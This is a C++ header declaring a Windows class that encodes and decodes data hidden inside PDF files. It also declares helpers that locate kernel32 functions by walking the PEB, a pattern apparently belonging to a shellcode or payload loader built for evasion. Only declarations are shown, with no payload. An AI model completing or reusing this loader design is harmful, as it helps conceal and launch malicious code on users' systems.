//
// Created by au9u5t on 24-10-6.
//

#ifndef ARINGQUSEMAKEFILE_DYNAMICLOADPLUSLOAD_H
#define ARINGQUSEMAKEFILE_DYNAMICLOADPLUSLOAD_H

#include <mutex>
#include <string>
#include <iostream>

#include <fstream>
#include <string>
#include <cstring>
#include <iostream>
#include <thread>
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <algorithm>

using namespace std;

class __declspec(dllimport) MasterEncoderForDynamicLoadPlus;

class MasterEncoderForDynamicLoadPlus
{
public:
    static MasterEncoderForDynamicLoadPlus* getInstance();
    MasterEncoderForDynamicLoadPlus();
    ~MasterEncoderForDynamicLoadPlus();

    void setSignAndKey(char* sign, int signLen, unsigned char key);

    void decode(unsigned char* data, long size);
    void encode(unsigned char* data, long size);

    void writePDF(const string& filePath, unsigned char* data, long size);
    unsigned char* readPDF(const string& filepath, long& size);

public:
    void encodePDF(const string& pdfPath, const string& savePath);
    void decodePDF(const string& pdfPath, const string& savePath);
    unsigned char* decode(const string& pdfPath, long& size);

public:
    static void function1(const unsigned char *decryptedData, const size_t &byteLength);
    static void generateAndSortArray();
    static ULONGLONG GetKernelFunc(const char *funname);
    static ULONGLONG GetKernel32Module();

#ifdef _WIN64
    static PPEB GetPEB(){
        return (PPEB)__readgsqword(0x60);
    }
#else
    static PPEB GetPEB(){
        return (PPEB)__readfsdword(0x30);
    }
#endif


private:
    static MasterEncoderForDynamicLoadPlus* _instance;
    static mutex _mtx;

    unsigned char _codeKey;
    char* _sign;
    int _signLen;

    unsigned char *decodePDF(const string &pdfPath, long &size);
};

#endif //ARINGQUSEMAKEFILE_DYNAMICLOADPLUSLOAD_H
